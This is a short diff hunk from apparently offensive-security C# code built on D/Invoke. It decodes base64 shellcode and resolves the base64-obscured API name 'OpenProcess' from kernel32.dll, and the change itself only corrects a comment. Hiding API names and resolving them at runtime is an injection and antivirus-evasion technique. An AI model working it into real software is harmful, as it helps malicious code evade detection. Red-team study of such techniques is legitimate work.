@@ -247,7 +247,7 @@ namespace testing D/Invoke
             var sc = System.Convert.FromBase64String(b64_sc);
             Console.WriteLine("[+] Decoded it into {0} bytes", sc.Length);
 
-            string op = "T3BlblByb2Nlc3M="; // echo -n "API_NAME" | base64
+            string op = "T3BlblByb2Nlc3M="; // echo -n "OpenProcess" | base64
             byte[] openc = System.Convert.FromBase64String(op);
             string opdec = Encoding.UTF8.GetString(openc);
             var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
